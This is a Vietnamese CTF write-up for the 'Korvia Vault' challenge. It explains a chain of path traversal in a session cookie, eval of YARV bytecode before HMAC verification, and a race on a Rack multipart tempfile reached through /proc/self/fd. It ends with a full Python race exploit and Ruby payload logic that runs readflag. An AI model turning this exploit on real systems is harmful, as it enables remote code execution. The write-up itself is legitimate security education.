---
title: "Korvia Vault — Project Nightfall"
slug: "project-nightfall-korvia-vault"
platform: "Global Cyber Skills Benchmark CTF 2026"
difficulty: "Medium"
vulnerabilities: ["Path Traversal","Insecure Deserialization","Race Condition"]
publishedAt: "2026-09-14"
summary: "Ghi lại quá trình phân tích session, Rack và các thử nghiệm trong Korvia Vault của Project Nightfall."
draft: false
sortOrder: 2
---
## I. Overview
Korvia Vault biến một lỗi session tưởng như chỉ là `path traversal` thành RCE, vì session file được load như `YARV bytecode` rồi `eval`. PoC không cần upload endpoint thật: lợi dụng `Rack` multipart để tạo `tempfile` chứa payload, sau đó race `/profile` đọc nó qua `/proc/self/fd/<n>` trong lúc `/register` bị BCrypt giữ lại. Khi trúng FD, payload chạy `readflag` và đưa flag vào `created_at` để profile render ra HTML.
## II. Tổng quan kiến trúc của challenge

Challenge gồm 3 lớp chính dưới đây
- `Nginx` mở cổng công khai ở `1337`, nhận toàn bộ kết nối vào nhưng không xử lý logic. Sau khi nhận toàn bộ request người dùng, nó chuyển tiếp request vào app viết bằng `Sinatra` phía sau để xử lý.
- Ứng dụng web chính được viết bằng `Ruby/Sinatra` và chạy ở cổng nội bộ `4567`. Port này không được public trực tiếp ra ngoài mà chỉ nhận request được chuyển tiếp từ Nginx đã nói ở trên.
- Bên trong hệ thống có một ứng dụng java chạy hai service riêng: một là WebSocket trên cổng `3000`, hai là service HTTPs trên cổng `8000`. Cả hai service này đều chỉ bind trên địa chỉ `127.0.0.1`

Tất cả service đều được `supervisord` quản lý. Cả ứng dụng public và ứng dụng internal đều chạy dưới quyền user `appuser`. Flag không thể đọc trực tiếp vì nằm trong `/root`, và chỉ có thể lấy thông qua binary SUID `readflag`
## III. Phân tích mã nguồn
### 1. `Dockerfile`
- Cài thêm Ruby, Nginx, Supervisor và compiler C.
Tạo user `appuser`; hai app Ruby/Java chạy bằng user này, không chạy trực tiếp bằng root.
![image](https://hackmd.io/_uploads/r1Ol-4SlGe.png)
- Binary readflag được gán owner là root bằng `chown root:root`, sau đó `chmod 4755`. Tức là, khi user thường như `appuser` chạy binary này, process sẽ có effective UID là root, cho phép chương trình thực hiện các thao tác cần quyền root, ví dụ đọc flag.
![image](https://hackmd.io/_uploads/H1RUX4Slzg.png)

### 2. `Entrypoint.sh`

- Đoạn này giấu flag bằng cách đổi sang tên file ngẫu nhiên trong `/root` và chỉ cho root đọc. Vì vậy `appuser` không thể tự `cat /root/flag...txt`, mà phải thông qua binary SUID như `readflag`.
![image](https://hackmd.io/_uploads/rk_fI4Blfg.png)
### 3. `supervisord.conf`
- Container có 3 service: `internal app`, `external app` và `nginx`. Hai app chạy quyền thấp hơn là `appuser` và còn `nginx` chạy bằng root.
![image](https://hackmd.io/_uploads/rkPqDNHxGg.png)
$\Rightarrow$ 
```text=
supervisord
├─ nginx          root     public :1337
├─ external-app   appuser  127.0.0.1:4567
└─ internal-app   appuser  127.0.0.1:3000, 127.0.0.1:8080
```
### 4. `nginx.conf`
- Nginx chỉ expose port `1337` cho user bên ngoài.Tất cả request vào `/`được reverse proxy sang Sinatra ở `127.0.0.1:4567`. Các header `Upgrade` và `Connection` được giữ lại để route như `/ws-bridge` có thể dùng WebSocket. 
- *(WebSocket là một kiểu kết nối giữa browser/client và server cho phép gửi dữ liệu hai chiều liên tục trên cùng một connection.)*
![image](https://hackmd.io/_uploads/B1ZQc8Sefx.png)
```text=
User ── :1337 ──> nginx ──proxy_pass──> Sinatra :4567
```
### 5. `external-app\app.rb`
#### Session
- User được lưu trong users.json, password không lưu plaintext mà được hash bằng BCrypt. Mỗi user còn có một secret riêng, dùng để ký và kiểm tra session của chính user đó.
![image](https://hackmd.io/_uploads/BJrv1vSgGx.png)
![image](https://hackmd.io/_uploads/rkiXxPrgfx.png)
- App không lưu session dạng `JSON` thuần mà tạo `Ruby hash` rồi compile thành `YARV bytecode` trước khi ghi ra file.
![image](https://hackmd.io/_uploads/Skg2LwBefe.png)
![image](https://hackmd.io/_uploads/BygYxtKSezx.png)
(https://androidgrl.github.io/2019/01/20/interpretation/)
*(Ruby không chạy trực tiếp source code theo dạng text. Source code Ruby được compile thành YARV bytecode, sau đó Ruby VM đọc các instruction này để thực thi chương trình. Vì vậy bytecode có thể hiểu là “ngôn ngữ trung gian” giữa Ruby code và Ruby VM.)*
- Hàm này lấy `session_id` để tìm file session trong thư mục sessions, nếu file tồn tại thì đọc binary YARV, load lại bằng `RubyVM::InstructionSequence.load_from_binary`, rồi eval. Vậy nếu mình kiểm soát được file session được đọc này thì mình có thể thực thi code Ruby.
![image](https://hackmd.io/_uploads/SyLi9tHlGg.png)
#### Cookie 
- Cookie session được ghép theo dạng `session_id|signature`, sau đó parse bằng ký tự `|`. Signature là `HMAC-SHA256` của `username`, ký bằng `secret` riêng của user, rồi server so sánh lại khi kiểm tra. Điểm đáng chú ý là server phải load session để lấy `username` trước, sau đó mới tìm user và kiểm tra `signature`.
![image](https://hackmd.io/_uploads/SJ1mlqHlGl.png)
#### Login và Profile
- Khi login thành công, app tạo `session_id` ngẫu nhiên rồi gọi `create_session` để ghi session dạng `YARV bytecode`. Sau đó app ký `username` bằng `secret` của user, ghép thành cookie `session_id|signature` và gửi về client.
![image](https://hackmd.io/_uploads/rynABcHxGl.png)
- Route `/profile` lấy cookie, parse ra `session_id|signature`, dùng `session_id` để load session rồi lấy `username` bên trong session. Sau đó server mới verify HMAC bằng `secret` của user; nếu hợp lệ thì render dữ liệu session ra `profile.erb`.
![image](https://hackmd.io/_uploads/rJQSd5Blfl.png)

**profile.erb**
- Dữ liệu trong `@session` được đưa ra giao diện. Cụ thể, template hiển thị `username` và thời điểm session được tạo `(created_at)`.
![image](https://hackmd.io/_uploads/S1xJKqrgfx.png)

**WebSocket Bridge**
- `/ws-bridge` yêu cầu user đã login. Nó lấy cookie session, load session từ `session_id`, lấy `username`, tìm user tương ứng rồi verify HMAC bằng `user['secret']`.
![image](https://hackmd.io/_uploads/Sk9vgnSlGe.png)
- Nếu request là WebSocket, app hijack connection rồi mở TCP socket tới `127.0.0.1:<port>`. Port mặc định là `3000`, nhưng có thể bị đổi thông qua tham số `ref`, nên route này hoạt động như một `bridge/proxy` từ bên ngoài vào service nội bộ.
![image](https://hackmd.io/_uploads/HkwMbnBxzl.png)
### 6.`internal-app\...\InternalApplication.java`

- `InternalApplication` khởi động hai service nội bộ: một `TLS server` và một `WebSocket server`. Sau đó main thread được giữ chạy liên tục, nên cả hai service cùng tồn tại trong `internal-app`.
![image](https://hackmd.io/_uploads/B1Xmf3Sgfe.png)

### 7.`internal-app\...\WSserver.java`
- WebSocket server này có 3 action chính: `process_xml`, `get_candle_status`, và `get_realm_activity`. Hai action sau chủ yếu chỉ trả về trạng thái/thông tin, `process_xml` đáng chú ý hơn vì nó nhận dữ liệu XML từ user rồi đưa vào parser. Nếu parser cấu hình không an toàn, XML có thể bị lợi dụng để đọc file, gọi URL nội bộ hoặc gây lỗi kiểu XXE/SSRF.
![image](https://hackmd.io/_uploads/SkuXohBxfx.png)
- `processXml` nhận XML dạng base64 từ user, decode ra chuỗi XML rồi đưa vào `DocumentBuilder` để parse. Điểm đáng chú ý là parser vẫn cho phép external entity với `http://` và `file://`, nên đây là bề mặt có thể thử XXE để đọc file local hoặc gọi request tới service nội bộ.
![image](https://hackmd.io/_uploads/BJ-aA3Hezx.png)
### 8.`internal-app\...\TlsServer.java`
- TLS server chỉ listen trên `127.0.0.1`, nên bên ngoài không truy cập trực tiếp được. Đáng chú ý là server bật `setWantClientAuth(true)`, tức có hỗ trợ/ưu tiên client certificate, nhưng không bắt buộc tuyệt đối như `setNeedClientAuth(true)`.
![image](https://hackmd.io/_uploads/HkNcSaBlzl.png)

**$\Rightarrow$  Ta có một cái sơ đồ nhỏ để nhìn lại tổng quan app**
```text=
┌──────────────────────────────────────────────────────────────────────────────┐
│                                                                              │
│  supervisord                                                                 │
│                                                                              │
│  ├─ nginx :1337  ◄──────────────────────── User Browser                      │
│  │     │                                  HTTP / WebSocket                   │
│  │     ▼                                                                      │
│  │  Ruby Sinatra external-app :4567                                           │
│  │                                                                            │
│  │  ├─ /register                                                              │
│  │  │     └─ users.json                                                       │
│  │  │        username / BCrypt password / user secret                         │
│  │  │                                                                         │
│  │  ├─ /login                                                                 │
│  │  │     ├─ sessions/<session_id>                                            │
│  │  │     │  YARV bytecode session                                            │
│  │  │     └─ Set-Cookie: session=session_id|HMAC                              │
│  │  │                                                                         │
│  │  ├─ /profile                                                               │
│  │  │     └─ load_session(session_id)                                         │
│  │  │        └─ load_from_binary → eval → session_data                        │
│  │  │           └─ verify HMAC → render profile.erb                           │
│  │  │                                                                         │
│  │  └─ /ws-bridge                                                             │
│  │        └─ Java WebSocket :3000                                             │
│  │           ├─ get_candle_status                                             │
│  │           ├─ get_realm_activity                                            │
│  │           └─ process_xml(base64 XML)                                       │
│  │                                                                            │
│  ├─ Java HTTPS :8080                                                          │
│  │     ├─ /                                                                   │
│  │     ├─ /realms                                                             │
│  │     ├─ /api/realm-secrets                                                  │
│  │     └─ /api/prophecies                                                     │
│  │                                                                            │
│  └─ /usr/local/bin/readflag, SUID root                                        │
│        └─ /root/flag_<random>.txt                                             │
│                                                                              │
└──────────────────────────────────────────────────────────────────────────────┘
```
## IV. Xây dựng luồng khai thác
### Phân tích lỗ hổng
#### 1. `load_session()` đọc file theo `session_id` không validate
-  `session_id` lấy từ cookie -> đưa vào `File.join()` -> không check `regex/path traversal`
![image](https://hackmd.io/_uploads/SyLi9tHlGg.png)
- Logout `parsed[:session_id].match?(/\A[a-f0-9]{32}\z/)`có validate `session_id` phải là 32 ký tự hex, nhưng các route quan trọng như `/profile` và `/ws-bridge` lại load session trực tiếp mà không kiểm tra format. Điều này cho thấy lỗ hổng nằm ở việc `session_id` bị dùng như tên file tùy ý, có thể dẫn tới đọc/load file ngoài thư mục session nếu mình kiểm soát được giá trị này.
$\Rightarrow$ CWE - 22 Path Traversal
#### 2. Unsafe deserialization dẫn đến code execution bằng YARV
- Cũng trong `load_session` Khi `load_from_binary` rồi `eval`, app thực thi nội dung trong file đó. nếu mình kiểm soát được YARV $\Rightarrow$ RCE
![image](https://hackmd.io/_uploads/Skz3VASeGg.png)
$\Rightarrow$ CWE-502 Deserialization of Untrusted Data
#### 3. Server eval session trước, rồi mới kiểm tra HMAC sau.
- Nếu ép được `session_id` trỏ tới một file YARV mình kiểm soát, code trong file đó có thể chạy trước khi signature bị reject.
![image](https://hackmd.io/_uploads/SJWyyyIgzg.png)
![image](https://hackmd.io/_uploads/SJsbky8efx.png)
#### 4. `WsServer.java` có XML parser cho phép `file://` và `http://`
- Đây là hướng XXE/SSRF tiềm năng. Nhưng trong bài này, nó giống rabbit hole hơn, vì `process_xml` chỉ trả ``{"status":"ok"}`` và không echo nội dung entity ra response.
![image](https://hackmd.io/_uploads/HJRiDy8xGl.png)

### Xây dựng lộ trình khai thác
- Ở lỗ hổng số 2, nếu đưa được file `YARV` của mình vào server thì dẫn tới RCE. Tuy nhiên, app lại không có upload endpoint nào rõ ràng cả.
- Giờ ta sẽ đi tìm hiểu một khái niệm mới `Rack` trong Ruby.
![image](https://hackmd.io/_uploads/HkUY1bUxMg.png)
(https://thecodest.co/en/blog/the-role-of-rack-in-the-ruby-ecosystem/)
- `Rack` là lớp trung gian chuẩn của Ruby giữ Web server và web framework. Trong Ruby web stack, server như Puma không gọi trực tiếp sang route Sinatra. Thay vào đó request được đóng gọi theo chuẩn `Rack` rồi đưa app xử lý.
![image](https://hackmd.io/_uploads/SkdpQZLezx.png)
- Khi code có route như này thì để có params[:username], framework phải parse body request. Và nếu là request bình thường thì `Content-Type: application/x-www-form-urlencoded`
- Tuy nhiên nếu mình gửi `Content-Type: multipart/form-data; boundary=...` thì `Rack` sẽ thấy đây là multipart body và gọi parser multipart của nó.
![image](https://hackmd.io/_uploads/rJBtVZLxMl.png)
- Khi request multipart có file filed, `Rack` sẽ lấy nội dung file upload bỏ vào một `Tempfile`.`Tempfile` này là file tạm, không phải file upload “chính thức” của app. Nó được tạo tự động ở tầng Rack để chứa data upload.
$\Rightarrow$  Dù không có chức năng upload, mình vẫn có thể gửi multipart request tới `/register` để khiến `Rack` tạo một temporaty file chứa YARV payload của mình.
![image](https://hackmd.io/_uploads/SyhvuW8gze.png)
- Tuy nhiên, trong lúc request đang xử lý, server sẽ có một file tạm kiểu `/tmp/abcxxxx`. và ta sẽ không biết chính xác tên này. Ở đây, ta lại phải sử dụng một kiến thức liên quan đến Linux.
![image](https://hackmd.io/_uploads/BJkzoW8xMx.png)
- Nghĩa là `/proc/pid/fd` là thư mục chứa mỗi file descriptor mà process đang mở và mỗi entry là sympolic link tới file thật. Hiểu đơn giản là, Ruby process mở một tempfile $\Rightarrow$ Linux gán cho một FD ví dụ là 12 đi $\Rightarrow$ `/proc/self/fd/12` trỏ tới file này.
- Tuy nhiên, ta cần một yếu tố nữa. Mình sẽ dùng request `profile` để dùng path traversal. Nhưng để nó xảy ra được thì, request này phải chạy trong cùng process đang giữ FD. Mã nguồn thì không cho thấy Puma chạy cluster multi-process. Nên mình có thể chấp nhận rằng challenge có một Ruby process cho primitive `/proc/self/fd/<n>`.
- Và như đã nói ở trên, `tempfile` chỉ là một file tạm thời. Nó có thể bị xóa khi object bị garbage collect hoặc Ruby interpreter kết thúc. 
$\Rightarrow$ Chúng ta cần race ở đây
- Tức là một bên ta sẽ gửi  POST `register` và trong lúc request chưa kết thúc, tempfile sẽ có cơ hội tồn tại và phải chạy luôn một request 
`GET /profile
Cookie session=../../../proc/self/fd/<n>|signature`
- Và trong `register` có một thao tác làm request đứng lại đủ lâu đó là
![image](https://hackmd.io/_uploads/BJrv1vSgGx.png)
- `BCrypt::Password.create` có tham số `:cost`. `:cost` là biến logarithmic quyết định hash tốn bao nhiêu tính toán; cost càng cao thì việc hash/check password càng chậm. Vì vậy gọi `BCrypt::Password.create(password)` trong /register là một điểm làm request xử lý lâu hơn, giúp mở rộng race trong lúc `tempfile` còn tồn tại. Đó cũng chính là lý do chúng ta chọn `/register` chứ không phải route khác.
![image](https://hackmd.io/_uploads/rkWS__Ugzl.png)
- Và có một điểm nữa ta cần chú ý là app vẫn verify HMAC sau khi eval. Nên nếu mình muốn lấy flag qua HTML respone của profile ở kênh `<span class="session-meta">HTB{...}</span>` thì mình cần signature hợp lệ.
![image](https://hackmd.io/_uploads/rkqsKuIeMx.png)
$\Rightarrow$ Ta có lộ trình khai thác như sau:
1. Register + login user `exploituser` để lấy signature hợp lệ.
2. Compile YARV payload. Payload chạy `/usr/local/bin/readflag`,
   rồi trả về session hash có:
   `username = "exploituser"`
   `created_at = output của readflag.`
3. Gửi POST `/register` dạng multipart, trong file field chứa YARV binary.
   Rack parse multipart và tạo Tempfile chứa payload.
4. Trong lúc `/register` đang bị giữ lại bởi `BCrypt`,
   gửi song song GET `/profile` với cookie:
   `session=../../../proc/self/fd/<fd>|<valid_signature>`
5. Nếu `<fd>` trỏ đúng tới Rack Tempfile,
   `load_session()` sẽ đọc YARV payload qua `/proc/self/fd/<fd>`.
6. App gọi `load_from_binary()` rồi `iseq.eval`.
   Tại đây RCE xảy ra trước khi HMAC được verify.
7. Sau eval, payload trả về session hash có username `exploituser`,
   nên HMAC pass nhờ signature đã lấy từ bước login.
8. `/profile` render `@session[:created_at]`,
   trong đó chứa output của `readflag`, nên flag xuất hiện trong HTML response.
### Tiến hành khai thác
- Đầu tiên ta tiến hành lấy một signature hợp lệ. Ta đăng ký và login như bình thường server sẽ set một session với giá trị như trên và khi decode ta sẽ có dạng `"#{session_id}|#{signature}"` và sẽ lấy được một signature hợp lệ.
![image](https://hackmd.io/_uploads/H17UytLeGg.png)
- Mình tạo một file session giả ở ngoài thư mục `sessions/`, rồi ép `/profile` đọc file đó bằng path traversal.
![image](https://hackmd.io/_uploads/HJZCQtIxGl.png)
```ruby=
code = %q({
  username: 'testuser1',
  session_id: 'manual',
  created_at: 'PATH_TRAVERSAL_PROOF',
  valid: true
})
```
![image](https://hackmd.io/_uploads/SyOGVFUezx.png)
- Ta đã thành công trong việc chứng minh path traversal.
- Giờ ta gửi `/register` dưới dạng `multipart/form-data`. Log cho thấy file filed được lưu lại tại `/tmp/RackMultipart...` với `fd=13`. Và do `/register` tiếp tục chạy Bcrypt khoảng 200 ms => FD tồn tại đủ lâu để đọc qua `/proc/self/fd/13.`
![image](https://hackmd.io/_uploads/HyXHDYIgfx.png)
- Xâu chuỗi gần như đã hoàn chỉnh giờ ta sẽ thực hiện khai thác cuối với PoC sau để race và sẽ có flag
### PoC
```python=
#!/usr/bin/env python3
"""
Korvia Vault exploit.
Race: multipart upload -> Rack Tempfile -> /proc/self/fd/N -> YARV eval.
"""
import os
import random
import re
import string
import sys
import threading
import time
from concurrent.futures import ThreadPoolExecutor, as_completed

import requests


TARGET = sys.argv[1].rstrip("/") if len(sys.argv) > 1 else "http://154.57.164.79:31326"
SCRIPT_DIR = os.path.dirname(os.path.abspath(__file__))
PAYLOAD_DIR = os.path.abspath(os.path.join(SCRIPT_DIR, "..", "korvia_vault", "korvia_vault"))
YARV_AMD64 = os.path.join(PAYLOAD_DIR, "yarv_payload_amd64.bin")
USERNAME = "exploituser"
PASSWORD = "password123"


def register_user():
    r = requests.post(
        f"{TARGET}/register",
        data={"username": USERNAME, "password": PASSWORD},
        allow_redirects=False,
        timeout=30,
    )
    print(f"[*] Register: {r.status_code}")


def login_and_get_signature():
    s = requests.Session()
    s.post(
        f"{TARGET}/login",
        data={"username": USERNAME, "password": PASSWORD},
        allow_redirects=False,
        timeout=30,
    )
    cookie = s.cookies.get("session")
    if not cookie:
        return None
    parts = cookie.split("%7C") if "%7C" in cookie else cookie.split("|")
    if len(parts) != 2:
        return None
    print(f"[*] Login OK. Sig: {parts[1][:16]}...")
    return parts[1]


def load_yarv():
    with open(YARV_AMD64, "rb") as f:
        data = f.read()
    print(f"[*] YARV loaded (amd64): {len(data)} bytes")
    return data


def check_public_flag():
    try:
        r = requests.get(f"{TARGET}/f.txt", timeout=3)
        if r.status_code == 200 and len(r.text.strip()) > 3:
            return r.text.strip()
    except Exception:
        pass
    return None


def probe_fd(fd, signature):
    path = f"../../../proc/self/fd/{fd}"
    cookie_val = f"{path}|{signature}"
    try:
        r = requests.get(
            f"{TARGET}/profile",
            headers={"Cookie": f"session={cookie_val}"},
            allow_redirects=False,
            timeout=3,
        )
        if r.status_code == 200:
            match = re.search(r'session-meta">(.*?)</span>', r.text)
            if match and len(match.group(1).strip()) > 3:
                return fd, match.group(1).strip()
    except Exception:
        pass
    return fd, None


def do_upload(yarv_data):
    upload_user = "u" + "".join(random.choices(string.ascii_lowercase + string.digits, k=10))
    try:
        files = {"file": ("p.bin", yarv_data, "application/octet-stream")}
        data = {"username": upload_user, "password": PASSWORD}
        requests.post(f"{TARGET}/register", data=data, files=files, timeout=15)
    except Exception:
        pass


def main():
    print(f"[*] Target: {TARGET}")
    yarv_data = load_yarv()
    register_user()
    signature = login_and_get_signature()
    if not signature:
        print("[!] Login failed")
        return 1

    fd_min, fd_max = 11, 60
    max_attempts = 500
    print(f"\n[*] Racing FDs {fd_min}-{fd_max}, {max_attempts} attempts")
    print(f"[*] Each attempt: 1 upload + {fd_max - fd_min + 1} parallel probes\n")

    for attempt in range(1, max_attempts + 1):
        sys.stdout.write(f"\r[*] Attempt {attempt}/{max_attempts}")
        sys.stdout.flush()

        t_upload = threading.Thread(target=do_upload, args=(yarv_data,))
        t_upload.start()

        time.sleep(0.05)

        with ThreadPoolExecutor(max_workers=24) as executor:
            futures = {
                executor.submit(probe_fd, fd, signature): fd
                for fd in range(fd_min, fd_max + 1)
            }
            for future in as_completed(futures, timeout=5):
                try:
                    fd, flag = future.result()
                    if flag:
                        print(f"\n\n{'=' * 60}")
                        print(f"[!!!] FLAG on FD {fd}: {flag}")
                        print(f"{'=' * 60}")
                        return 0
                except Exception:
                    pass

        t_upload.join(timeout=10)

        if attempt % 10 == 0:
            pub = check_public_flag()
            if pub:
                print(f"\n\n[+] FLAG (public): {pub}")
                return 0

    pub = check_public_flag()
    if pub:
        print(f"\n[+] FLAG (public): {pub}")
        return 0

    print(f"\n[!] No flag after {max_attempts} attempts")
    return 1


if __name__ == "__main__":
    raise SystemExit(main())

```
- Payload trong PoC là file `yarv_payload_amd64.bin`, tức Ruby YARV bytecode đã được compile sẵn cho môi trường Ruby amd64. Khi được `load_session()` đọc và gọi: `RubyVM::InstructionSequence.load_from_binary(yarv_binary).eval`.Payload YARV là Ruby code đã được compile thành bytecode. Logic của nó tương đương đoạn Ruby này:
```RUBY=
system("/usr/local/bin/readflag > /opt/external-app/public/f.txt")
{
  username: "exploituser",
  session_id: "p",
  created_at: %x{/usr/local/bin/readflag 2>&1}.strip,
  valid: true
}
```
- Sau khi chạy ta sẽ có flag sau:
![image](https://hackmd.io/_uploads/H1z65YLlze.png)